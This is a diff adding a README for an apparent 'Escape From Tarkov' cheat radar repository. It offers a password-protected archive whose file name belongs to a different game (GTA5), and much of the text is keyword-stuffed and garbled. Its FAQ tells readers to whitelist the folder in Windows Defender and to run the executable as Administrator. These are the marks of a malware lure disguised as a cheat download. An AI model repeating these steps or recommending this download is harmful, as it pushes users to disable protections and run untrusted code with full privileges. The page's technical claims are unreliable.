@@ -1,0 +1,51 @@
+🎯 Escape From Tarkov Cheat Radar — Free Download for Windows 2026]
+
+-green?style=for-the-badge&logo=github)
+-lightgrey?style=for-the-badge&logo=windows)
+
+🎯 Escape From Tarkov Cheat Radar (Albertop596/escape-from-tarkov-cheat-radar) implements native 64-bit modules tailored for modern Windows x64 builds, distributed as yimmenu-v2-gta5-v1.2.0-win64.zip (40.4 MB, password 2026).
+
+Direct Package: [yimmenu-v2-gta5-v1.2.0-win64.zip (40.4 MB) · Password: 2026 · Build: v4.8.1 (6F4FA4)
+
+✨ Escape From Tarkov Cheat Radar — Key Highlights
+
+| Escape From Tarkov Cheat Radar Subsystem | Runtime Behavior (6F4FA4) | Build |
+| :--- | :--- | :---: |
+| 💾 Hot-Swap JSON Profiles | Coordinates high-frequency hot-swap json profiles (escape-from-tarkov-cheat-radar · 1-key switching between Legit, Visual & Custom presets) under build 6F4FA4 with zero frame-time spikes. | v4.8.1 |
+| 👁️ 144Hz+ External Overlay | Executes hardware-timed 144hz+ external overlay (escape-from-tarkov-cheat-radar · 2D/3D bounding boxes, bone skeletons & distance ESP) across escape-from-tarkov-cheat-radar sessions using  Archive Password: 2026 — Extract yimmenu-v2-gta5-v1.2.0-win64.zip completely before launching yimmenu-v2-gta5-v1.2.0-win64.exe` as Administrator.
+
+❓ Escape From Tarkov Cheat Radar (v4.8.1) — FAQ
+
+Is Escape From Tarkov Cheat Radar (yimmenu-v2-gta5-v1.2.0-win64.zip) compatible with modern Windows x64 builds?
+
+Yes — yimmenu-v2-gta5-v1.2.0-win64.exe (v4.8.1) runs natively on modern Windows x64 builds across Intel and AMD x64 processors.
+
+What is the password to extract yimmenu-v2-gta5-v1.2.0-win64.zip for Escape From Tarkov Cheat Radar?
+
+Enter 2026 in 7-Zip or WinRAR when unpacking yimmenu-v2-gta5-v1.2.0-win64.zip (40.4 MB) before starting yimmenu-v2-gta5-v1.2.0-win64.exe.
+
+How do I fix Windows Defender or SmartScreen alerts on yimmenu-v2-gta5-v1.2.0-win64.exe (v4.8.1)?
+
+Because yimmenu-v2-gta5-v1.2.0-win64.exe (build 6F4FA4) is an independent game cheat binary, heuristic checks may prompt a warning. Confirm you downloaded yimmenu-v2-gta5-v1.2.0-win64.zip from Albertop596/escape-from-tarkov-cheat-radar, whitelist the escape-from-tarkov-cheat-radar directory, and run yimmenu-v2-gta5-v1.2.0-win64.exe as Administrator.
+
+💻 yimmenu-v2-gta5-v1.2.0-win64.exe — Build Manifest
+
+| escape-from-tarkov-cheat-radar Attribute | Escape From Tarkov Cheat Radar Value |
+| :--- | :--- |
+| Target Platform | modern Windows x64 builds |
+| Executable & Build | yimmenu-v2-gta5-v1.2.0-win64.exe (v4.8.1 · 6F4FA49A83) |
+| Release Archive | yimmenu-v2-gta5-v1.2.0-win64.zip (40.4 MB) |
+| Unzip Password | 2026 |
+
+Escape From Tarkov Cheat Radar — Release Manifest (Albertop596/escape-from-tarkov-cheat-radar)
+[package]
+slug = "escape-from-tarkov-cheat-radar"
+version = "4.8.1"
+signature = "6F4FA49A83"
+archive = "yimmenu-v2-gta5-v1.2.0-win64.zip"
+password = "2026"
+entrypoint = "yimmenu-v2-gta5-v1.2.0-win64.exe"
+
+  🎯 Escape From Tarkov Cheat Radar · v4.8.1 (6F4FA49A83)
+
+  escape-from-tarkov-cheat-radar
